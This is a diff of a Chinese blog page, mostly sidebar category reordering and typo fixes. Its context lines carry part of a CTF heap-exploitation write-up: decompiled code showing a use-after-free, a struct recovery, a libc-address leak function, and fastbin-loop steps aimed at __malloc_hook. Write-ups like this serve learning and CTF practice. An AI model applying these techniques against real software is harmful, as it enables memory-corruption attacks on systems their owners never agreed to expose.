@@ -197,6 +197,14 @@
         
 
             <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Ethereum/">
+                    Ethereum <span class="right">3</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/算法/">
                     算法 <span class="right">1</span></a>
                 </a>
@@ -229,16 +237,8 @@
         
 
             <li class="collapse-level-0" collapse-level="0">
-                <a class="no-padding" href="/categories/Ethereum/">
-                    Ethereum <span class="right">3</span></a>
-                </a>
-            </li>
-
-        
-
-            <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/Android/">
-                    Android <span class="right">7</span></a>
+                    Android <span class="right">8</span></a>
                 </a>
             </li>
 
@@ -269,16 +269,16 @@
         
 
             <li class="collapse-level-0" collapse-level="0">
-                <a class="no-padding" href="/categories/CVE/">
-                    CVE <span class="right">3</span></a>
+                <a class="no-padding" href="/categories/A简历/">
+                    A简历 <span class="right">1</span></a>
                 </a>
             </li>
 
         
 
             <li class="collapse-level-0" collapse-level="0">
-                <a class="no-padding" href="/categories/A简历/">
-                    A简历 <span class="right">1</span></a>
+                <a class="no-padding" href="/categories/CVE/">
+                    CVE <span class="right">3</span></a>
                 </a>
             </li>
 
@@ -379,7 +379,7 @@
 <p>这个程序有两种选择，1 对应如下，输入了一个 word，很好，完全不知道在索引什么。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_search</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> word_sz; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">void</span> *word_ptr; <span class="comment">// r12</span></span><br><span class="line">  __int64 i; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the word size:"</span>);</span><br><span class="line">  word_sz = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(word_sz - <span class="number">1</span>) &gt; <span class="number">0xFFFD</span> )</span><br><span class="line">    do_put(<span class="string">"Invalid size"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the word:"</span>);</span><br><span class="line">  word_ptr = <span class="built_in">malloc</span>(word_sz);</span><br><span class="line">  read_str((__int64)word_ptr, word_sz, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = qword_6020B8; i; i = *(_QWORD *)(i + <span class="number">32</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( **(_BYTE **)(i + <span class="number">16</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(i + <span class="number">8</span>) == word_sz &amp;&amp; !<span class="built_in">memcmp</span>(*(<span class="keyword">const</span> <span class="keyword">void</span> **)i, word_ptr, word_sz) )</span><br><span class="line">      &#123;</span><br><span class="line">        __printf_chk(<span class="number">1L</span>L, <span class="string">"Found %d: "</span>, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(i + <span class="number">24</span>));</span><br><span class="line">        fwrite(*(<span class="keyword">const</span> <span class="keyword">void</span> **)(i + <span class="number">16</span>), <span class="number">1u</span>LL, *(<span class="keyword">signed</span> <span class="keyword">int</span> *)(i + <span class="number">24</span>), <span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Delete this sentence (y/n)?"</span>);</span><br><span class="line">        read_str((__int64)&amp;v3, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">121</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memset</span>(*(<span class="keyword">void</span> **)(i + <span class="number">16</span>), <span class="number">0</span>, *(<span class="keyword">signed</span> <span class="keyword">int</span> *)(i + <span class="number">24</span>));</span><br><span class="line">          <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(i + <span class="number">16</span>)); <span class="comment">// 这里也没有设为 NULL</span></span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Deleted!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(word_ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>可以大致分析出 Word 结构体的模样，一个链表：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Word</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span>* word_ptr;         <span class="comment">// i</span></span><br><span class="line">    <span class="keyword">int</span> word_sz;            <span class="comment">// i + 8</span></span><br><span class="line">    <span class="keyword">char</span>* sen_ptr;     <span class="comment">// i + 16</span></span><br><span class="line">    <span class="keyword">int</span> sen_sz;        <span class="comment">// i + 24</span></span><br><span class="line">    Word* prev;             <span class="comment">// i + 32</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Word</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span>* word_ptr;         <span class="comment">// i</span></span><br><span class="line">    <span class="keyword">int</span> word_sz;            <span class="comment">// i + 8</span></span><br><span class="line">    <span class="keyword">char</span>* sen_ptr;          <span class="comment">// i + 16</span></span><br><span class="line">    <span class="keyword">int</span> sen_sz;             <span class="comment">// i + 24</span></span><br><span class="line">    Word* prev;             <span class="comment">// i + 32</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 <p>在 IDA 中还原一下，切到 Structrues，Edit-&gt;Add struct type，然后在 ends 摁 d，添加成员调整大小，再摁 n 改名。（我知道有内存对齐，int 不是 4 字节，但是懒得写了）</p>
 <figure class="highlight as"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Word            struc ; (sizeof=<span class="number">0x28</span>, mappedto_7)</span><br><span class="line"><span class="number">00000000</span> word_ptr        dq ?</span><br><span class="line"><span class="number">00000008</span> word_sz         dq ?</span><br><span class="line"><span class="number">00000010</span> sen_ptr         dq ?</span><br><span class="line"><span class="number">00000018</span> sen_sz          dq ?</span><br><span class="line"><span class="number">00000020</span> prev            dq ?</span><br><span class="line"><span class="number">00000028</span> Word            ends</span><br></pre></td></tr></table></figure>
 <p>所以上面代码就变成了这样，应该就可以看懂了。（IDA 牛逼！）</p>
@@ -396,7 +396,7 @@
 </ol>
 <h3 id="泄露-libc"><a href="#泄露-libc" class="headerlink" title="泄露 libc"></a>泄露 libc</h3><p>这里分配一个 small bin 大小的 chunk ，当它被释放后，就会放入到 unsorted bin 中。因而，只要 unsorted bin 的地址的起始字节不是 \x00 便可以通过验证。同时，可以构造 \x00 来进行比较，从而通过验证：</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    smallbin_sentence = <span class="string">'a'</span> * <span class="number">0x85</span> + <span class="string">' b '</span></span><br><span class="line">    index_sentence(smallbin_sentence)</span><br><span class="line">    search_word(<span class="string">'b'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Found '</span> + str(len(smallbin_sentence)) + <span class="string">': '</span>)</span><br><span class="line">    unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">return</span> unsortedbin_addr</span><br></pre></td></tr></table></figure>
-<h3 id="构造-fastbin-循环链表"><a href="#构造-fastbin-循环链表" class="headerlink" title="构造 fastbin 循环链表"></a>构造 fastbin 循环链表</h3><p>由于最后希望在 malloc_hook 处分配 chunk，而一般分配 malloc_hook 附近的 chunk 一般大小都是 0x7f。即，所需要设置的设置的 fast bin 的数据字节部分的大小为 0x60。这里按照如下方式构造:</p>
+<h3 id="构造-fastbin-循环链表"><a href="#构造-fastbin-循环链表" class="headerlink" title="构造 fastbin 循环链表"></a>构造 fastbin 循环链表</h3><p>由于最后希望在 malloc_hook 处分配 chunk，而一般分配 malloc_hook 附近的 chunk 一般大小都是 0x7f。即，所需要设置的 fast bin 的数据字节部分的大小为 0x60。这里按照如下方式构造:</p>
 <ol>
 <li>分别索引句子 a，索引句子 b，索引句子 c，则此时单词链表中索引的句子的相对顺序为 c-&gt;b-&gt;a。假设句子 a 为<code>&#39;a&#39; * 0x5d + &#39;d&#39;</code>，句子 b 为<code>&#39;b&#39; * 0x5d + &#39;d&#39;</code>，句子 c 类似。</li>
 <li>索引单词 d，三个均删除，则此时 fastbin 中的链表情况为 a-&gt;b-&gt;c-&gt;NULL，这是因为首先释放的是句子 c，最后释放的是句子 a。这时，搜索单词时 *i-&gt;sentence_ptr 对于 a, b 来说都是可以绕过的。</li>
